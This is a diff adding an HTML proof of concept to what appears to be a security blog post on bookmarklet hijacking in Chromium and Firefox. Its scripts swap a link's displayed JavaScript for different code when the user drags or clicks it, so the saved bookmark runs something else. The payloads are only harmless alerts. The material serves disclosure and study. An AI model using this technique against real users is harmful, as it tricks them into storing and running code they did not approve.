@@ -34,3 +34,75 @@ You can see it hee: [https://xss.vavkamil.cz/bookmarklet.html](https://xss.vavka
 ### Mozilla Firefox 119.0
 
 <video src="/assets/img/2023/10/bookmarklets_firefox.webm"></video>
+
+```javascript
+<html>
+<head>
+    <title>Bookmarklet hijacking PoC</title>
+</head>
+<body>
+    <h1>Bookmarklet hijacking</h1>
+    <h2>Chromium Proof of Concept</h2>
+
+    <h3>Steps to reproduce</h3>
+    <p>1. <strong>Double-check that the link executes</strong> <code>alert(1)</code></p>
+    <p>2. <strong>Drag & drop the link to Bookmarks (tool)bar</strong></p>
+    <p>3. <strong>Double-check that the link executes</strong> <code>alert(1)</code></p>
+    <p>4. <strong>Click the link in Bookmarks; it executes</strong> <code>alert(2)</code></p>
+    <br>
+    <a href="javascript: (() => { alert(1); })();" id="myLink" draggable="true">Save this cool bookmarklet!</a>
+
+    <script>
+        const linkElement = document.getElementById('myLink');
+        const originalLink = linkElement.href;
+
+        linkElement.addEventListener('dragstart', function(event) {
+            const newLink = "javascript: (() => { alert(2); })();";
+            event.target.href = newLink;
+
+            // Set the data for the drag event to the new link
+            event.dataTransfer.setData('text/uri-list', newLink);
+            event.dataTransfer.setData('text/plain', newLink);
+
+            console.log('Link location changed to:', event.target.href);
+        });
+
+        linkElement.addEventListener('dragend', function(event) {
+            // Reset the link back to its original value after the drag operation has ended
+            event.target.href = originalLink;
+            console.log('Link location reset to:', event.target.href);
+        });
+    </script>
+
+    <hr>
+
+    <h2>Firefox Proof of Concept</h2>
+
+    <h3>Steps to reproduce</h3>
+    <p>1. <strong>Double-check that the link executes</strong> <code>alert(1)</code></p>
+    <p>2. <strong>Right-click & Bookmark link... & Save</strong></p>
+    <p>3. <strong>Double-check that the link executes</strong> <code>alert(1)</code></p>
+    <p>4. <strong>Click the link in Bookmarks; it executes</strong> <code>alert(2)</code></p>
+    <br>
+    <a href="javascript: (() => { alert(1); })();" id="myLink_2">Save this cool bookmarklet!</a>
+
+    <script>
+        const linkElement_2 = document.getElementById('myLink_2');
+        const originalLink_2 = linkElement_2.href;
+
+        linkElement_2.addEventListener('mousedown', function(event) {
+            const newLink = "javascript: (() => { alert(2); })();";
+            event.target.href = newLink;
+
+            console.log('Link location changed to:', event.target.href);
+        });
+
+        linkElement_2.addEventListener('mouseover', function(event) {
+            // Reset the link back to its original value after the drag operation has ended
+            event.target.href = originalLink;
+            console.log('Link location reset to:', event.target.href);
+        });
+    </script>
+</body>
+</html>
+```
